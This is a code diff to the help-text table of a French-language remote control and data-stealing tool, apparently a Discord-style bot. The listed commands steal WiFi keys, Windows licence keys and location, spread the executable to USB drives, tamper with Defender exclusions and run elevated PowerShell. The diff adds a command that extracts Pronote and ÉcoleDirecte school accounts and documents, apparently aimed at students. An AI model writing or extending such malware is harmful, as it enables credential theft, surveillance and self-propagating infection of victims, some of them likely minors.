@@ -49,6 +49,7 @@ var helpSections = map[string]string{
 
 	"steal": "```\n" +
 		"!steal               extraction complète vers -steal\n" +
+		"!ecole               Pronote / ÉcoleDirecte + documents scolaires\n" +
 		"!wifi                profils WiFi et clés en clair\n" +
 		"!licence             clés d'activation Windows\n" +
 		"!localisation        position + adresse\n" +
@@ -60,6 +61,7 @@ var helpSections = map[string]string{
 		"!spread              duplique l'exe sur le poste et les clés USB\n" +
 		"!defender            état Defender (exclude = exclusions, admin)\n" +
 		"!elevate <cmd>       PowerShell en admin (UAC sur la machine)\n" +
+		"!power sleep|lock|logoff|off|restart\n" +
 		"!shutdown [r] [ts]   éteint ou redémarre (r = redémarre)\n" +
 		"!delete confirm      SUPPRESSION TOTALE du payload\n" +
 		"```",
